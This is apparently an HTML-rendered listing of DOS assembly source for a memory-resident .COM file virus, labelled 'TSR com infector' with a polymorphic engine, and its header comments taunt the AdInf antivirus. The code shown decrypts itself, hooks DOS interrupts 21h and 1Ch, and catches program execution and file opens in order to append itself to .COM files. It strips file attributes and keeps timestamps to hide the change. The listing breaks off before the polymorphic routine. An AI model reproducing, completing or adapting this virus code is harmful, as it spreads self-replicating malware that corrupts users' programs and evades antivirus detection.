<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>RC_1440.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; TSR com infector á ¯®«¨¬®àä¨ª £¥­¥à â®à®¬ [IDA] v_0.01.</span><span class="sc0">
</span><span class="sc1">;                             Wait for next versions !!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Copyright by Serg_Enigma</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc2">.386p</span><span class="sc0">            </span><span class="sc1">;             ÚÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">            </span><span class="sc1">;             ³ AdInf  ³</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">;             ³  MUST  ³</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;             ³   DIE  ³</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sc</span><span class="sc0">       </span><span class="sc1">;             ÀÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">200d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">08h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sc</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_offset</span><span class="sc0">
</span><span class="sc5">Get_offset</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Get_offset</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dat</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">lng_II</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Dream</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc12">'SE'</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">dream</span><span class="sc0">


</span><span class="sc5">Dat</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1996h</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Rt</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc5">mem</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">03</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc5">mem</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Stc</span><span class="sc0">
    </span><span class="sc6">Adc</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">s1</span><span class="sc0"> </span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">s2</span><span class="sc0"> </span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Sc</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Lng</span><span class="sc0">
    </span><span class="sc6">Cld</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0">     </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">res</span><span class="sc4">-</span><span class="sc2">103h</span><span class="sc4">-</span><span class="sc2">200d</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">351Ch</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc5">hm</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc5">lm</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_1c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">103h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200d</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">rt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Buf_j</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;       Push    Di</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Cwd</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">Res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Pushf</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0"> </span><span class="sc1">;run</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Get_name</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">   </span><span class="sc1">;rename</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Get_name</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">   </span><span class="sc1">;open</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Get_name</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">   </span><span class="sc1">;atribut</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Get_name</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc5">Get_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Clc</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
</span><span class="sc5">z1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">lng_ext</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">z1</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">
</span><span class="sc5">lng_ext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Test_ext</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">
</span><span class="sc5">Test_ext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0dfdfh</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'BI'</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Ex</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">
    </span><span class="sc6">Jne</span><span class="sc0">     </span><span class="sc5">Ex</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">
    </span><span class="sc6">Jne</span><span class="sc0">     </span><span class="sc5">Ex</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Infect</span><span class="sc0">
</span><span class="sc5">Ex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">set_24</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Ch</span><span class="sc4">,</span><span class="sc8">Ch</span><span class="sc0">
    </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">      </span><span class="sc5">late</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">move</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buf_j</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buf_j</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Close</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,-</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Close</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">move</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">move</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">62000d</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">New_j</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">202d</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">


</span><span class="sc1">;################################## [IDA] v_0.01 ##############################</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Poly</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">              </span><span class="sc1">;                 #############################</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;                 #</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">           </span><span class="sc1">;                 #</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">D_last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203</span><span class="sc0"> </span><span class="sc1">;            #</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">              </span><span class="sc1">;                 #</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">              </span><span class="sc1">;                 #</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">          </span><span class="sc1">;                 #</span><span class="sc0">
</span><span class="sc1">;#########################################        #</span><span class="sc0">
